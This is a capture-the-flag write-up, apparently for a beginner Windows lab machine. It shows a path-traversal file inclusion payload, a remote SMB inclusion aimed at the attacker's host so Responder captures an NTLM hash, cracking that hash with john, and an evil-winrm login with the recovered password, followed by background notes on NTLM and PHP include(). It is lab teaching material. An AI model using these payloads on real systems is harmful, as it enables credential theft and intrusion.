# Intro
| Dificulty | OS | Start Date | End Date | Help? |
|---|---|---|---|---|
| Very Easy | Windows | 24/05/2022 | 24/05/2022 | Yes |


# Thought process
1. View running services with `nmap`.
2. Edit `/etc/hosts` for being able to see the web.
3. Check how web works and think if I can attack doing File Inclusion.
4. Capture Administrator NTLM.
5. Dump hash file to get Administrator Password.
6. Connect with WinRM and find flag file.


# Resolution
Edit `/etc/hosts` like this:
```bash
@IP unika.htb
```

Test the "page" parameter to see if we can access to some commonly known files that will have the same name across networks, Windows domains, and systems. [Link](https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt)
The most common file to check as Pentester is `WINDOWS\System32\drivers\etc\hosts`.
Final URL: `page=../../../../../../../../windows/system32/drivers/etc/hosts` 
The file incluson was made possible thanks to `include()` method of php is being used by page parameter to load differents `.html` depending the lengague of the site.

In the PHP configuration file `php.ini` , "allow_url_include" wrapper is set to "Off" by default, indicating that PHP does not load remote HTTP or FTP URLs to prevent remote file inclusion attacks. However, even if allow_url_include and allow_url_fopen are set to "Off", PHP will not prevent the loading of SMB URLs. 
We can use `Responder` to steal NTLM hash.
```bash
$ sudo python3 Responder.py -I tun0
```

Now we tell the server to include a resource from our SMB Server by setting the "page" parameter.
```
http://unika.htb/?page=//@IP/somefile
```

The server will try to finde the file but it doesn't exists. Mean while, we captured the NetNTLMv for the Administrator User. Now with `john` we can dump the hash.
```bash
$ john -w=/usr/share/wordlists/rockyou.txt hash.txt
```
[hash.txt]: Is the hash captured with Responder and redirected to a file.

Finally, with the username and password, we can WinRM the machine to find if there's any file with the Flag.
```bash
$ evil-winrm -i @IP_Server -u administrator -p badminton
```
[type]: Command to view the content.


# WinRM
Windows-native built-in remote management protocol that basically uses Simple Object Access Protocol to interact with remote computers and servers, as well as Operating Systems and applications. 
WinRM allows the user to : 
	→ Remotely communicate and interface with hosts 
	→ Execute commands remotely on systems that are not local to you but are network accessible. 
	→ Monitor, manage and configure servers, operating systems and client machines from a remote location
[//]: We can find credentials (typically username and password) for a user who has remote management privileges and execute PS.


# File Inclusion Vulnerability
Dynamic websites include HTML pages on the fly based on some of the parameters (Cookies, POST parameters...)

## Local
Local File Inclusion occurs when an attacker is able to get a website to include a file that was not intended to be an option for this application. A common example is when the attacker can use `../` in the inputted file and view sensitive files of the server.

## Remote
Similar to LFI but in this case it is possible for an attacker to load a remote file on the host using protocols like HTTP, FTP etc.


# include()
```php
File 1 --> vars.php 
<?php

$color = 'green';
$fruit = 'apple';

?>

############################################# 

File 2 --> test.php
<?php

echo "A $color $fruit"; // output = "A"
include 'vars.php';
echo "A $color $fruit"; // output = "A green apple"

?>
```
More info about php include(). [Link](https://www.php.net/manual/en/function.include.php)


# NTLM
Collection of authentication protocols created by Microsoft. It is a challenge-response authentication protocol used to authenticate a client to a resource on an Active Directory domain.
1. The client sends the user name and domain name to the server. 
2. The server generates a random character string, referred to as the challenge. 
3. The client encrypts the challenge with the NTLM hash of the user password and sends it back to the server. 
4. The server retrieves the user password (or equivilent). 
5. The server uses the hash value retrieved from the security account database to encrypt the challenge string. The value is then compared to the value received from the client. If the values match, the client is authenticated.

More info about NTLM. [Link](https://www.ionos.com/digitalguide/server/know-how/ntlm-nt-lan-manager/)


# Responder
! It can be used in a lot of ways, in this CTF is going to recreate a SMB Server.

When the target machine attempts to perform the NTLM authentication to that server, Responder sends a challenge back for the server to encrypt with the user's password. When the server responds, Responder will use the challenge and the encrypted response to generate the NetNTLMv2. While we can't reverse the NetNTLMv2, we can try many different common passwords to see if any generate the same challenge response, and if we find one, we know that is the password.